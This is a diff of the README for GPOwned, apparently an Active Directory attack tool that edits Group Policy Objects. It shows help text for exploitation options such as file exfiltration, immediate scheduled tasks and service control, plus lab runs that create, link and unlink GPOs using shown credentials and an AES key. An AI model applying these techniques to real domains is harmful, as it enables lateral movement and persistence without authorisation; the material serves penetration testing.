@@ -7,38 +7,105 @@ The script uses `impacket` and `ldap3` to update the GPOs. It implements enough 
 # Usage
 
 ```
-psyconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -h
+python3 GPOwned.py --help
 		GPO Helper - @TheXC3LL
+		Modifications by - @Fabrizzio53
 
 
-usage: GPOwned.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-dc-ip ip address] [-listgpo] [-displayname display name] [-name GPO name] [-listgplink] [-ou GPO name] [-gpocopyfile] [-gpomkdir] [-gporegcreate] [-gposervice] [-gpoexfilfiles]
-                  [-gpoimmtask] [-gpoimmuser User for ImmTask] [-srcpath Source file] [-dstpath Destination path] [-hive Registry Hive] [-type Type] [-key Registry key] [-subkey Registry subkey] [-default] [-value Registry value] [-service Target service]
-                  [-action Service action] [-author Task Author] [-taskname Task Name] [-taskdescription Task description] [-gpcuser] [-gpcmachine] [-gpoupdatever] [-usercontext] [-backup Backup location]
+usage: GPOwned.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN]
+                  [-hashes [LMHASH]:NTHASH] [-dc-ip ip address / hostname]
+                  [-aesKey hex key] [-use-ldaps] [-no-pass] [-k] [-listgpo]
+                  [-listsite] [-listou] [-listdomain]
+                  [-displayname display name] [-listgplink] [-linkgpotoou]
+                  [-linkgpotosite] [-linkgpotodomain] [-removelinkou]
+                  [-removelinkdomain] [-removelinksite] [-creategpo]
+                  [-deletegpo] [-comment COMMENT] [-ou GPO name]
+                  [-name GPO name] [-ouname ouname] [-sitename sitename]
+                  [-gpcuser] [-gpcmachine] [-backup Backup location]
+                  [-gpocopyfile] [-gpomkdir] [-gporegcreate] [-gposervice]
+                  [-gpoexfilfiles] [-gpoimmtask]
+                  [-gpoimmuser User for ImmTask] [-srcpath Source file]
+                  [-dstpath Destination path] [-hive Registry Hive]
+                  [-type Type] [-key Registry key] [-subkey Registry subkey]
+                  [-default] [-value Registry value] [-service Target service]
+                  [-action Service action] [-author Task Author]
+                  [-taskname Task Name] [-taskdescription Task description]
+                  [-gpoupdatever] [-usercontext]
 
 GPO Helper - @TheXC3LL
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
+  -use-ldaps            Use LDAPS instead of LDAP
+  -no-pass              tell the script to not use password, good with -k
+
+authentication & connection:
   -u USERNAME, --username USERNAME
                         valid username
   -p PASSWORD, --password PASSWORD
-                        valid password (if omitted, it will be asked unless -no-pass)
+                        valid password (if omitted, it will be asked unless
+                        -no-pass)
   -d DOMAIN, --domain DOMAIN
                         valid domain name
   -hashes [LMHASH]:NTHASH
                         NT/LM hashes (LM hash can be empty)
-  -dc-ip ip address     IP Address of the domain controller
+  -dc-ip ip address / hostname
+                        IP Address of the domain controller or the fqdn use
+                        when -k
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
+                        bits)
+  -k                    Tell the script to use kerberos auth
+
+enumeration:
   -listgpo              Retrieve GPOs info using LDAP
+  -listsite             Retrieve SITE info using LDAP
+  -listou               Retrieve OU info using LDAP
+  -listdomain           Retrieve info from the domain object, such as the
+                        gPLink one
   -displayname display name
-                        Filter using the given displayName [only with -listgpo]
-  -name GPO name        Filter using the GPO name ({Hex})
+                        Filter using the given displayName [only with
+                        -listgpo]
   -listgplink           Retrieve the objects the GPO is linked to
+
+Creation / Deletion / Linking:
+  -linkgpotoou          Tell the script to link a gpo to a OU, the OU needs to
+                        be passed at -ouname and a gpo with -name
+  -linkgpotosite        Tell the script to link a gpo to a SITE, the SITE
+                        needs to be passed at -sitename and a gpo with -name
+  -linkgpotodomain      Tell the script to link a gpo to a DOMAIN, the DOMAIN
+                        needs to be passed at -d and a gpo with -name
+  -removelinkou         tell the script to remove a gpo link from a OU, needs
+                        to be passed at -ouname and a gpo with -name
+  -removelinkdomain     tell the script to remove a gpo link from a DOMAIN,
+                        needs to be passed at -d and a gpo with -name
+  -removelinksite       tell the script to remove a gpo link from a SITE,
+                        needs to be passed at -sitename and a gpo with -name
+  -creategpo            tell the script to create a gpo
+  -deletegpo            tell the script to remove a gpo
+  -comment COMMENT      Tell the script to add a GPO.cmt with a text to the
+                        new created gpo.
+
+General parameters that can be passed to multiple commands:
   -ou GPO name          Filter using the ou [only with -listgplinks]
-  -gpocopyfile          Edit the target GPO to copy a file to the target location
+  -name GPO name        Filter using the GPO name ({Hex}) or gpo name to
+                        add,delete when using -creategpo / -deletegpo
+  -ouname ouname        Tell the script what OU to link the gpo
+  -sitename sitename    Tell the script what SITE to link the gpo
+  -gpcuser              GPO is related to users
+  -gpcmachine           GPO is related to machines
+
+backup:
+  -backup Backup location
+                        Location of backup folder
+
+exploitation:
+  -gpocopyfile          Edit the target GPO to copy a file to the target
+                        location
   -gpomkdir             Edit the target GPO to create a new folder
   -gporegcreate         Edit the target GPO to create a registry key/subkey
   -gposervice           Edit the target GPO to start/stop/restart a service
-  -gpoexfilfiles        Edit the target GPO to exfil a file (* to all) to the target location
+  -gpoexfilfiles        Edit the target GPO to exfil a file (* to all) to the
+                        target location
   -gpoimmtask           Edit the target GPO to add a Immediate Task
   -gpoimmuser User for ImmTask
                         User to run the immediate task
@@ -61,15 +128,8 @@ optional arguments:
   -taskname Task Name   Name for the Scheduled Task
   -taskdescription Task description
                         Description for the scheduled task
-  -gpcuser              GPO is related to users
-  -gpcmachine           GPO is related to machines
   -gpoupdatever         Update GPO version (GPT.INI file and LDAP object)
   -usercontext          Execute the GPO in the context of the user
-  -backup Backup location
-                        Location of backup folder
-psyconauta@insulanova:~/Research/GPOwned|⇒  
-
-
 
 ```
 
@@ -347,3 +407,63 @@ psyconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -u eddard.stark
 
 [^] Have a nice day!
 ```
+
+## Create GPO
+Create a new GPO with or without a comment, -comment is not mandatory
+
+```
+proxychains4 -q python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -creategpo -name gpoowned -comment "This is a test comment"
+                GPO Helper - @TheXC3LL
+                Modifications by - @Fabrizzio53
+
+
+[*] Connecting to LDAP service at 172.16.92.10
+[+] Checking if the GPO with name gpoowned alreay exist.
+[*] Connecting to SMB service at 172.16.92.10
+[+] Checking if folder with guid {18B80436-628D-40E9-9204-66463A6F285E} exist
+[+] Creating necessary gpo files and folders
+[+] GPO created
+```
+
+## Linking a GPO
+After creating a GPO you can link in 3 ways, at a OU with -linkgpotoou, SITE with -linkgpoutosite or DOMAIN object with -linkgpotodomain
+```
+proxychains4 -q python3 GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -linkgpotoou -name gpoowned -ouname Servers
+                GPO Helper - @TheXC3LL
+                Modifications by - @Fabrizzio53
+
+
+[*] Connecting to LDAP service at 172.16.92.10
+[+] Checking if GPO gpoowned exists
+[+] GPO with hex {18B80436-628D-40E9-9204-66463A6F285E} found
+[+] OU dn is OU=Servers,DC=inlanefreight,DC=local
+[+] OU old gPLink is [LDAP://cn={8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756},cn=policies,cn=system,DC=inlanefreight,DC=local;1]
+[+] New gPLink is [LDAP://cn={18B80436-628D-40E9-9204-66463A6F285E},cn=policies,cn=system,DC=inlanefreight,DC=local;0][LDAP://cn={8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756},cn=policies,cn=system,DC=inlanefreight,DC=local;1]
+[+] GPO linked successfully
+```
+## Removing a GPO Link
+If you want you can remove a link from a gpo from a OU with -removelinkou, SITE with -removelinksite or DOMAIN object with -removelinkdomain
+```
+proxychains4 -q python3 GPOwned.py -u gabriel -aesKey 0A7FF58D7CB12557E46351FCABE4EF83BBC74953CCDBA71699E5833FECE83361 -d inlanefreight.local -dc-ip 172.16.92.10 -gpcmachine -removelinkou -name gpoowned -ouname Servers
+                GPO Helper - @TheXC3LL
+                Modifications by - @Fabrizzio53
+
+
+[*] Connecting to LDAP service at 172.16.92.10
+[+] Checking if GPO gpoowned exists
+[+] GPO with hex {18B80436-628D-40E9-9204-66463A6F285E} found
+[+] OU dn is OU=Servers,DC=inlanefreight,DC=local
+[+] OU old gPLink is [LDAP://cn={18B80436-628D-40E9-9204-66463A6F285E},cn=policies,cn=system,DC=inlanefreight,DC=local;0][LDAP://cn={8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756},cn=policies,cn=system,DC=inlanefreight,DC=local;1]
+[+] New gPLink is [LDAP://cn={8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756},cn=policies,cn=system,DC=inlanefreight,DC=local;1]
+[+] Removed old gpo link
+```
+
+# Known Bugs
+
+## Ldaps
+
+-use-ldaps have some bugs with ssl error EOF, no ideia if is a problem with the domain of in the code
+
+## Kerberos connection does not return the correct gpLink attribute when using the flag -listgpo
+
+For some reason kerberos return a strange output when asking for the gpLink
